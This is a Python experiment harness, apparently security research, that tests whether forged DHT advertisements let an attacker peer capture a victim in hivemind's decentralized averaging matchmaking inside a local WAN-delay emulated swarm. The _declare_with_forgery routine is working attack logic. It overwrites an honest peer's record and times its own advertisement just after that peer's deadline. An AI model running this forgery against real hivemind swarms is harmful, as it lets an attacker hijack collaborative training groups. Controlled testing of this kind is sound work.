"""Paired WAN-delay test: can forged advertisements make a later peer lead?

Uses step19's 28-node local swarm, five-region RIPE RTT profile, real DHT,
matchmaking and all-reduce. The attacker has one ordinary DHT identity. It
observes an honest advertisement, advertises just *after* that peer's
deadline, and (depending on arm) overwrites its record with False or True
at a far-future expiration. The scored victim is the latest-deadline honest
peer, selected by the harness after the fact. The attacker does not learn
hidden schedules. No key-adjacent identity or deadline undercut is
used. This is local WAN-delay emulation, not a public-WAN experiment.

The primary outcome is whether that particular victim joins the attacker and
completes an averaging step. A successful DHT overwrite alone is not capture.
"""

from __future__ import annotations

import argparse
import asyncio
import csv
import json
import math
import multiprocessing as mp
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import numpy as np

import step19_wan_delay_leader as wan

from hivemind.averaging.key_manager import GroupKeyManager
from hivemind.averaging.matchmaking import PotentialLeaders
from hivemind.utils.timed_storage import get_dht_time

baseline = wan.baseline
RESULTS = Path(__file__).resolve().parent / "results"
ARMS = ("control", "withdraw", "inflate")
ATTACK_ARM = "control"
FORGE_SECONDS = 3600.0
_ORIGINAL_GET_AVERAGERS = GroupKeyManager.get_averagers


async def _observed_averagers(self: GroupKeyManager, group_key: str, only_active: bool):
    found = await _ORIGINAL_GET_AVERAGERS(self, group_key, only_active)
    if baseline.CURRENT_ROUND is not None and baseline.CURRENT_ROUND.value >= 0 and only_active:
        baseline._record(
            "candidate_view", self.peer_id, group_key,
            {"candidates": [[str(peer), expiration] for peer, expiration in found]},
        )
    return found


async def _declare_with_forgery(self: PotentialLeaders, step, key_manager: GroupKeyManager):
    if not baseline.STRATEGY_THIS_PROCESS:
        return await baseline._ORIGINAL_DECLARE(self, step, key_manager)

    async with self.lock_declare:
        try:
            while get_dht_time() < self.search_end_time:
                await self.running.wait()
                read_started = time.perf_counter()
                try:
                    seen = await key_manager.get_averagers(key_manager.current_key, only_active=True)
                    read_error = ""
                except Exception as exc:
                    seen, read_error = [], type(exc).__name__
                read_latency = time.perf_counter() - read_started
                now = get_dht_time()
                candidates = sorted(
                    ((peer, expiration) for peer, expiration in seen
                     if peer != self.peer_id and math.isfinite(expiration)),
                    key=lambda item: (item[1], item[0].to_bytes()),
                )
                baseline._record(
                    "adaptive_read", self.peer_id, key_manager.current_key,
                    {"read_latency_s": read_latency, "seen_count": len(seen),
                     "candidate_count": len(candidates), "read_error": read_error},
                )
                # One observed honest deadline is enough to prove that our own
                # deadline is not globally earliest. Waiting for all three lets
                # the victim begin joining before an attacker can act at all.
                candidates = [(peer, expiration) for peer, expiration in candidates
                              if expiration > now]
                if not candidates:
                    await asyncio.sleep(0.05)
                    continue
                earlier_peer, earliest = candidates[0]
                declared = float(np.nextafter(earliest, np.inf))
                if declared <= now:
                    await asyncio.sleep(0.05)
                    continue

                group_key = key_manager.current_key
                baseline._record(
                    "attack_selected", self.peer_id, earlier_peer,
                    {"earlier_peer": str(earlier_peer), "earliest_honest_deadline": earliest,
                     "attacker_deadline": declared,
                     "selection_time": now, "arm": ATTACK_ARM},
                )
                self.declared_group_key = group_key
                self.declared_expiration_time = declared
                self.declared_expiration.set()
                baseline._record(
                    "adaptive_publication_started", self.peer_id, earlier_peer,
                    {"remaining_before_write_s": declared - get_dht_time(),
                     "declared_expiration": declared, "arm": ATTACK_ARM},
                )

                async def publish_self():
                    started = time.perf_counter()
                    try:
                        accepted = await key_manager.declare_averager(
                            group_key, self.peer_id, expiration_time=declared)
                        error = ""
                    except Exception as exc:
                        accepted, error = False, type(exc).__name__
                    return bool(accepted), error, time.perf_counter() - started, get_dht_time()

                async def forge_earlier():
                    started = time.perf_counter()
                    try:
                        accepted = await key_manager.dht.store(
                            key=group_key, subkey=earlier_peer.to_bytes(),
                            value=ATTACK_ARM == "inflate",
                            expiration_time=get_dht_time() + FORGE_SECONDS,
                            return_future=True,
                        )
                        error = ""
                    except Exception as exc:
                        accepted, error = False, type(exc).__name__
                    result = bool(accepted), error, time.perf_counter() - started, get_dht_time()
                    baseline._record(
                        "forgery_complete", self.peer_id, earlier_peer,
                        {"accepted": result[0], "error": result[1],
                         "write_latency_s": result[2], "completed_at": result[3],
                         "value": ATTACK_ARM == "inflate"},
                    )
                    return result

                # Concurrent stores are the strongest plausible read-then-write
                # attempt; their completion times are recorded independently.
                if ATTACK_ARM == "control":
                    own = await publish_self()
                    forged = None
                else:
                    own, forged = await asyncio.gather(publish_self(), forge_earlier())
                baseline._record(
                    "adaptive_publication", self.peer_id, earlier_peer,
                    {"accepted": own[0], "usable": own[0], "write_latency_s": own[2],
                     "error": own[1], "declared_expiration": declared,
                     "remaining_at_read_s": declared - now,
                     "remaining_at_write_s": declared - own[3],
                     "visible_after_write": None, "arm": ATTACK_ARM},
                )
                await asyncio.sleep(max(0.0, declared - get_dht_time()))
                if self.running.is_set() and len(self.leader_queue) == 0:
                    await key_manager.update_key_on_not_enough_peers()
        finally:
            if self.declared_group_key is not None:
                previous_key = self.declared_group_key
                previous_expiration = self.declared_expiration_time
                self.declared_group_key = None
                self.declared_expiration_time = float("inf")
                await key_manager.declare_averager(
                    previous_key, self.peer_id, previous_expiration, looking_for_group=False,
                )
                baseline._record("withdrew", self.peer_id, previous_key)


# Install before any averager child process starts. Honest peers still use the
# original publisher; the observer wrapper does not issue additional DHT reads.
GroupKeyManager.get_averagers = _observed_averagers
PotentialLeaders._declare_averager_periodically = _declare_with_forgery


def _detail(event: dict) -> dict:
    return json.loads(event["detail"])


def _first_event(events: list[dict], kind: str, *, peer: str | None = None, other: str | None = None):
    return next((event for event in events if event["kind"] == kind
                 and (peer is None or event["peer"] == peer)
                 and (other is None or event["other"] == other)), None)


def run_trial(*, arm: str, region: str, window: tuple[float, float], seed: int,
              scale: float, fillers: int, label: str) -> tuple[dict, list[dict]]:
    global ATTACK_ARM
    ATTACK_ARM = arm
    key_label = f"step20_{window[0]:g}_{window[1]:g}_seed{seed}"
    row, events = wan.run_trial(
        arm="late", scale=scale, round_id=0, seed=seed, fillers=fillers,
        label=label, key_label=key_label, attacker_region=region,
        safety_margin=0.0, observation_window=0.0,
        schedule_min=window[0], schedule_max=window[1],
    )
    row["arm"] = arm
    row["window"] = f"{window[0]:g}-{window[1]:g}"
    row["region"] = region
    row["seed"] = seed
    row["emulation_scale"] = scale
    for event in events:
        event["arm"] = arm
        event["window"] = row["window"]
        event["region"] = region
        event["seed"] = seed
    selected = _first_event(events, "attack_selected", peer=row["attacker_id"])
    honest_ids = json.loads(row["honest_peer_ids"])
    honest_deadlines = json.loads(row["honest_deadlines"])
    honest_statuses = json.loads(row["honest_statuses"])
    victim_index = max(range(len(honest_ids)), key=honest_deadlines.__getitem__)
    victim_id = honest_ids[victim_index]
    earlier_id = selected["other"] if selected else ""
    forged = _first_event(events, "forgery_complete", peer=row["attacker_id"])
    target_views = [event for event in events if event["kind"] == "candidate_view"
                    and event["peer"] == victim_id]
    visible_after_forge = ""
    if forged and target_views:
        later_views = [event for event in target_views
                       if float(event["emitted_at"]) >= float(forged["emitted_at"])]
        if later_views:
            earlier_entries = [entry for entry in _detail(later_views[0])["candidates"]
                               if entry[0] == earlier_id]
            visible_after_forge = ("absent" if not earlier_entries else
                                   f"present:{earlier_entries[0][1]:.6f}")
    target_join = _first_event(events, "outbound_join", peer=victim_id,
                               other=row["attacker_id"]) if victim_id else None
    begin = _first_event(events, "begin_allreduce_sent", peer=row["attacker_id"],
                         other=victim_id) if victim_id else None
    all_target_joins = [event for event in events if event["kind"] == "outbound_join"
                        and event["peer"] == victim_id]
    first_target_join = min(all_target_joins, key=lambda event: float(event["emitted_at"])) \
        if all_target_joins else None
    pre_join_views = [event for event in target_views
                      if first_target_join is not None
                      and float(event["emitted_at"]) <= float(first_target_join["emitted_at"])]
    first_join_view = _detail(pre_join_views[-1])["candidates"] if pre_join_views else []
    earlier_at_first_join = next((entry[1] for entry in first_join_view
                                  if entry[0] == earlier_id), None)
    own_publication = _first_event(events, "adaptive_publication", peer=row["attacker_id"])
    declared = _detail(selected)["attacker_deadline"] if selected else float("nan")
    intended_views = []
    if forged is not None:
        for event in target_views:
            if float(event["emitted_at"]) < float(forged["emitted_at"]):
                continue
            entry = next((item for item in _detail(event)["candidates"]
                          if item[0] == earlier_id), None)
            if (arm == "withdraw" and entry is None) or (arm == "inflate" and entry is not None
                                                        and entry[1] > float(forged["emitted_at"]) + 1000):
                intended_views.append(event)
    first_intended_view = min(intended_views, key=lambda event: float(event["emitted_at"])) \
        if intended_views else None
    row.update(
        target_id=victim_id,
        target_honest_index=victim_index,
        target_deadline=honest_deadlines[victim_index],
        target_status=honest_statuses[victim_index],
        target_eligible=int(bool(selected) and declared < honest_deadlines[victim_index]),
        attacker_deadline="" if selected is None else declared,
        earlier_honest_id=earlier_id,
        forged_peer_was_first_choice=int(bool(first_target_join) and
                                          first_target_join["other"] == earlier_id),
        target_join_attempt=int(target_join is not None),
        target_joined_attacker=int(begin is not None),
        target_completed_step=int(begin is not None and honest_statuses[victim_index] == "completed"),
        first_target_join_peer="" if first_target_join is None else first_target_join["other"],
        first_target_join_at="" if first_target_join is None else first_target_join["emitted_at"],
        earlier_at_first_join="" if earlier_at_first_join is None else earlier_at_first_join,
        forgery_before_first_join="" if forged is None or first_target_join is None else
                                  int(float(forged["emitted_at"]) < float(first_target_join["emitted_at"])),
        forgery_accepted="" if forged is None else int(_detail(forged)["accepted"]),
        forgery_latency_s="" if forged is None else f"{_detail(forged)['write_latency_s']:.4f}",
        target_view_after_forgery=visible_after_forge,
        first_intended_view_at="" if first_intended_view is None else first_intended_view["emitted_at"],
        intended_view_before_first_join="" if forged is None or first_target_join is None else
                                        int(first_intended_view is not None and
                                            float(first_intended_view["emitted_at"]) <
                                            float(first_target_join["emitted_at"])),
        selected_at="" if selected is None else selected["emitted_at"],
        own_write_at="" if own_publication is None else own_publication["emitted_at"],
        forgery_finished_at="" if forged is None else forged["emitted_at"],
        target_join_at="" if target_join is None else target_join["emitted_at"],
        target_begin_at="" if begin is None else begin["emitted_at"],
    )
    return row, events


def _write_csv(path: Path, rows: list[dict]) -> None:
    if not rows:
        return
    with path.open("w", newline="") as handle:
        writer = csv.DictWriter(handle, fieldnames=list(rows[0]))
        writer.writeheader()
        writer.writerows(rows)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--phase", choices=("gate", "sweep", "confirm"), default="gate")
    parser.add_argument("--profile", type=Path, default=wan.DEFAULT_PROFILE)
    parser.add_argument("--fillers", type=int, default=23)
    parser.add_argument("--seed", type=int, default=1925)
    parser.add_argument("--regions", nargs="+", choices=wan.REGIONS)
    parser.add_argument("--windows", nargs="+", choices=("short", "long"))
    parser.add_argument("--arms", nargs="+", choices=ARMS)
    parser.add_argument("--scale", type=float, default=None)
    parser.add_argument("--label", default="")
    args = parser.parse_args()
    if args.fillers < 17:
        parser.error("need at least 17 DHT-only fillers to exceed default k=20")
    if args.scale is not None and (args.scale < 0 or not math.isfinite(args.scale)):
        parser.error("scale must be finite and nonnegative")
    windows = {"short": (5.0, 7.0), "long": (11.0, 15.0)}
    if args.phase == "gate":
        regions = args.regions or ["SE"]
        selected_windows = args.windows or ["long"]
        seeds = [args.seed]
        scale = 0.0 if args.scale is None else args.scale
    elif args.phase == "sweep":
        regions = args.regions or list(wan.REGIONS)
        selected_windows = args.windows or ["short", "long"]
        seeds = [args.seed]
        scale = 1.0 if args.scale is None else args.scale
    else:
        regions = args.regions or list(wan.REGIONS)
        selected_windows = args.windows or ["short", "long"]
        seeds = [args.seed + 1, args.seed + 2]
        scale = 1.0 if args.scale is None else args.scale
    arms = args.arms or list(ARMS)
    wan.RTT_MS, profile_data = wan.load_profile(args.profile)
    label = args.label or datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    rows, events = [], []
    print(f"phase={args.phase} profile={profile_data['collected_at_utc']} "
          f"regions={regions} windows={selected_windows} arms={arms} seeds={seeds} "
          f"scale={scale}", flush=True)
    with mp.Manager() as manager:
        wan.PEER_REGIONS = manager.dict()
        for window_name in selected_windows:
            for seed in seeds:
                for region in regions:
                    order = arms if seed % 2 else list(reversed(arms))
                    for arm in order:
                        print(f"running {window_name} seed={seed} region={region} arm={arm}", flush=True)
                        row, trial_events = run_trial(
                            arm=arm, region=region, window=windows[window_name], seed=seed,
                            scale=scale, fillers=args.fillers, label=label,
                        )
                        rows.append(row)
                        events.extend(trial_events)
                        print(f"  target={row['target_id'][:12]} join={row['target_join_attempt']} "
                              f"begin={row['target_joined_attacker']} "
                              f"completed={row['target_completed_step']} "
                              f"forged={row['forgery_accepted']} view={row['target_view_after_forgery']} "
                              f"honest={row['honest_completed']}/3", flush=True)
        wan.PEER_REGIONS = None
    RESULTS.mkdir(exist_ok=True)
    stem = f"step20_forged_priority_{args.phase}_{label}"
    summary_path = RESULTS / f"{stem}_rounds.csv"
    events_path = RESULTS / f"{stem}_events.csv"
    _write_csv(summary_path, rows)
    _write_csv(events_path, events)
    print(f"wrote {summary_path}\nwrote {events_path}", flush=True)
    issues = [f"{row['region']} {row['window']} {row['arm']}: hard cancellation/stage leak"
              for row in rows if row["hard_cancellations"] or row["stage_leaks"]]
    for issue in issues:
        print(f"WARNING: {issue}", file=sys.stderr)
    return int(bool(issues))


if __name__ == "__main__":
    mp.set_start_method("fork", force=True)
    raise SystemExit(main())
